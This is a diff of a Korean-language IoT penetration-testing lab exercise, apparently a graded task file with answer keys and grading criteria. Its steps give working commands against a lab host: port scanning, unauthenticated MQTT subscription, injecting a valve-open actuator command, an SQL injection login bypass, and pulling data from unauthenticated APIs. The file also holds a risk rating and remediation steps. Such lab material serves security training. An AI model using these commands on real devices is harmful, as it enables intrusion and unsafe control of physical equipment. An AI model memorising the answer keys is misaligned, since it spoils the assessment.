@@ -17,26 +17,56 @@ steps:
   hint: nmap -sV -p 80,1883,5683,8080,8088,8554,8883 명령을 사용하세요.
   category: recon
   points: 10
-  answer: nmap -sV -p 80,1883,5683,8080,8088,8554,8883 10.20.30.80 2>/dev/null &&
-    echo 'IoT 종합 스캔 완료'
+  answer: nmap -sV -p 80,1883,5683,8080,8088,8554,8883 10.20.30.80 2>/dev/null && echo 'IoT 종합 스캔 완료'
   answer_detail: 여러 IoT 서비스 포트를 동시에 스캔하여 공격 표면을 파악합니다.
   verify:
     type: output_contains
     expect: IoT 종합 스캔 완료
     field: stdout
+    semantic:
+      intent: IoT 종합 포트 스캔 — nmap -sV -p 80,1883,5683,8080,8088,8554,8883 10.20.30.80. HTTP(80) + MQTT(1883)
+        + CoAP(5683) + HTTP-alt(8080/8088) + RTSP(8554) + MQTT-TLS(8883). 중간 평가 공격 표면 매핑.
+      success_criteria:
+      - IoT 종합 스캔 완료 키워드
+      - nmap -sV -p 7개 포트
+      - 다중 IoT 프로토콜 탐지
+      acceptable_methods:
+      - nmap -sV -p 다중 포트
+      - masscan -p80,1883,5683,8080,8088,8554,8883
+      - rustscan + nmap
+      - Shodan IoT 검색
+      negative_signs:
+      - 포트 5개 이하
+      - -sV 버전 탐지 없음
+      - IoT 프로토콜 매핑 없음
   target_vm: attacker
 - order: 2
   instruction: MQTT 브로커에 인증 없이 접근하고 모든 토픽을 구독하시오.
   hint: mosquitto_sub -h {{WEB_IP}} -t '#' 명령을 사용하세요.
   category: mqtt
   points: 10
-  answer: timeout 5 mosquitto_sub -h 10.20.30.80 -t '#' -v -C 3 2>/dev/null; echo
-    'MQTT 정찰 완료'
+  answer: timeout 5 mosquitto_sub -h 10.20.30.80 -t '#' -v -C 3 2>/dev/null; echo 'MQTT 정찰 완료'
   answer_detail: MQTT 미인증 접근은 OWASP IoT Top 10 I1에 해당하는 Critical 취약점입니다.
   verify:
     type: output_contains
     expect: MQTT 정찰 완료
     field: stdout
+    semantic:
+      intent: MQTT 미인증 구독 — timeout 5 mosquitto_sub -h 10.20.30.80 -t '#' -v -C 3. 원격 브로커 + 와일드카드 '#'
+        + 타임아웃. OWASP IoT I1 미인증 접근 Critical.
+      success_criteria:
+      - MQTT 정찰 완료 키워드
+      - mosquitto_sub -h 10.20.30.80 -t '#'
+      - -C 3 제한
+      acceptable_methods:
+      - mosquitto_sub -h + -t '#'
+      - paho-mqtt remote subscribe
+      - mqtt-explorer remote host
+      - nmap --script mqtt-subscribe
+      negative_signs:
+      - 원격 호스트 미지정
+      - 와일드카드 없음
+      - OWASP I1 Critical 맥락 없음
   target_vm: attacker
 - order: 3
   instruction: MQTT 브로커에 악성 메시지를 주입하시오.
@@ -50,59 +80,137 @@ steps:
     type: output_contains
     expect: MQTT 메시지 주입 완료
     field: stdout
+    semantic:
+      intent: MQTT 악성 메시지 주입 — mosquitto_pub -h 10.20.30.80 -t 'factory/actuator/valve' -m '{"action":"open","value":100}'.
+        인증 없음 → 액추에이터 제어 임의 조작. OT/IoT 안전 위협.
+      success_criteria:
+      - MQTT 메시지 주입 완료 키워드
+      - mosquitto_pub -h + factory/actuator/valve
+      - JSON 명령 페이로드
+      acceptable_methods:
+      - mosquitto_pub -h + -t -m
+      - paho-mqtt remote publish
+      - Node-RED remote publish
+      - MQTT Explorer publish
+      negative_signs:
+      - 액추에이터 토픽 맥락 없음
+      - 명령 페이로드 없음
+      - OT/IoT 안전 위협 맥락 없음
   target_vm: attacker
 - order: 4
   instruction: 웹 대시보드에 SQLi 공격을 수행하시오.
   hint: 로그인 폼에 SQL Injection 페이로드를 사용하세요.
   category: web
   points: 12
-  answer: "curl -s -o /dev/null -w '%{http_code}' \\\n     -X POST http://10.20.30.80:8088/login\
-    \ \\\n     -d \"username=admin' OR '1'='1'--&password=x\" 2>/dev/null; echo '\
-    \ SQLi 공격 완료'"
+  answer: "curl -s -o /dev/null -w '%{http_code}' \\\n     -X POST http://10.20.30.80:8088/login \\\n\
+    \     -d \"username=admin' OR '1'='1'--&password=x\" 2>/dev/null; echo ' SQLi 공격 완료'"
   answer_detail: SQL Injection으로 인증을 우회하고 데이터베이스에 접근할 수 있습니다.
   verify:
     type: output_contains
     expect: SQLi 공격 완료
     field: stdout
+    semantic:
+      intent: SQLi 인증 우회 — curl -X POST /login -d "username=admin' OR '1'='1'--&password=x". WHERE 조건
+        항상 참 + 주석. 중간 평가 웹 공격 재적용.
+      success_criteria:
+      - SQLi 공격 완료 키워드
+      - admin' OR '1'='1'-- 페이로드
+      - POST /login
+      acceptable_methods:
+      - curl + OR 1=1 페이로드
+      - sqlmap -u /login --forms --batch
+      - Burp Repeater + SQL 페이로드
+      - NoSQL $or injection
+      negative_signs:
+      - OR '1'='1' 페이로드 없음
+      - 주석 없음
+      - 인증 우회 목적 없음
   target_vm: attacker
 - order: 5
   instruction: API 엔드포인트에서 설정 정보를 탈취하시오.
   hint: /api/devices, /api/config 등 API를 탐색하세요.
   category: web
   points: 10
-  answer: curl -s http://10.20.30.80:8088/api/devices 2>/dev/null | head -3; echo
-    'API 정보 수집 완료'
+  answer: curl -s http://10.20.30.80:8088/api/devices 2>/dev/null | head -3; echo 'API 정보 수집 완료'
   answer_detail: 미인증 API에서 디바이스 정보, 설정 데이터가 유출될 수 있습니다.
   verify:
     type: output_contains
     expect: API 정보 수집 완료
     field: stdout
+    semantic:
+      intent: API 정보 탈취 — curl -s http://10.20.30.80:8088/api/devices. 미인증 API → 디바이스 목록/설정 유출. OWASP
+        API Security Top 10 API2 Broken Auth.
+      success_criteria:
+      - API 정보 수집 완료 키워드
+      - curl /api/devices
+      - 미인증 접근 수행
+      acceptable_methods:
+      - curl + API 엔드포인트
+      - httpx -path /api/*
+      - kiterunner kr scan
+      - Postman Collection + 자동 탐색
+      negative_signs:
+      - /api 경로 없음
+      - 미인증 맥락 없음
+      - API2 매핑 없음
   target_vm: attacker
 - order: 6
   instruction: 발견된 취약점 목록과 위험도 평가를 작성하시오.
   hint: Critical, High, Medium, Low로 위험도를 분류하세요.
   category: report
   points: 12
-  answer: echo '=== 취약점 목록 ===' && echo '[Critical] MQTT 미인증 접근' && echo '[Critical]
-    SQLi 인증 우회' && echo '[High] API 미인증 접근' && echo '[High] MQTT 평문 통신' && echo '[Medium]
-    XSS (Reflected)' && echo '=== 위험도 평가 완료 ==='
+  answer: echo '=== 취약점 목록 ===' && echo '[Critical] MQTT 미인증 접근' && echo '[Critical] SQLi 인증 우회' && echo
+    '[High] API 미인증 접근' && echo '[High] MQTT 평문 통신' && echo '[Medium] XSS (Reflected)' && echo '=== 위험도
+    평가 완료 ==='
   answer_detail: 취약점의 위험도는 공격 용이성과 영향도를 기반으로 평가합니다.
   verify:
     type: output_contains
     expect: 위험도 평가 완료
     field: stdout
+    semantic:
+      intent: 취약점 위험도 평가 — [Critical] MQTT 미인증 + SQLi 인증 우회 + [High] API 미인증 + MQTT 평문 + [Medium] XSS
+        Reflected. 공격 용이성 x 영향도 기반 등급. CVSS v3.1 참고.
+      success_criteria:
+      - 위험도 평가 완료 키워드
+      - Critical/High/Medium 구분
+      - 5개 이상 취약점
+      acceptable_methods:
+      - echo 등급별 목록
+      - CVSS v3.1 계산기
+      - OWASP Risk Rating Methodology
+      - DefectDojo 위험도 매트릭스
+      negative_signs:
+      - 취약점 3개 이하
+      - 위험도 등급 없음
+      - CVSS 맥락 없음
   target_vm: attacker
 - order: 7
   instruction: 침투 테스트 보고서의 권고안을 작성하시오.
   hint: 각 취약점에 대한 구체적인 보안 대책을 제시하세요.
   category: report
   points: 10
-  answer: echo '=== 보안 권고안 ===' && echo '[긴급] MQTT 인증 + ACL 설정' && echo '[긴급] SQLi
-    패치 (Prepared Statement)' && echo '[높음] API 인증 미들웨어 구현' && echo '[높음] MQTT TLS
-    적용' && echo '[중간] 보안 헤더 추가 (CSP, X-Frame)' && echo '=== 권고안 완료 ==='
+  answer: echo '=== 보안 권고안 ===' && echo '[긴급] MQTT 인증 + ACL 설정' && echo '[긴급] SQLi 패치 (Prepared Statement)'
+    && echo '[높음] API 인증 미들웨어 구현' && echo '[높음] MQTT TLS 적용' && echo '[중간] 보안 헤더 추가 (CSP, X-Frame)' &&
+    echo '=== 권고안 완료 ==='
   answer_detail: 보안 권고안은 우선순위와 구현 일정을 포함해야 합니다.
   verify:
     type: output_contains
     expect: 권고안 완료
     field: stdout
+    semantic:
+      intent: 보안 권고안 — [긴급] MQTT 인증+ACL + SQLi Prepared Statement + [높음] API 인증 미들웨어 + MQTT TLS + [중간]
+        CSP/X-Frame 보안 헤더. 우선순위 + 구현 일정 포함 권장. 침투 테스트 보고서 4단계 (Exec Summary → 기술 상세 → 위험도 → 권고).
+      success_criteria:
+      - 권고안 완료 키워드
+      - 긴급/높음/중간 우선순위
+      - 5개 이상 권고
+      acceptable_methods:
+      - echo 구조화 권고
+      - PTES (Pen Test Execution Standard)
+      - OWASP Testing Guide 권고 템플릿
+      - NIST SP 800-115 침투 보고서
+      negative_signs:
+      - 우선순위 없음
+      - 권고 3개 이하
+      - 구체 기술 대책 없음
   target_vm: attacker
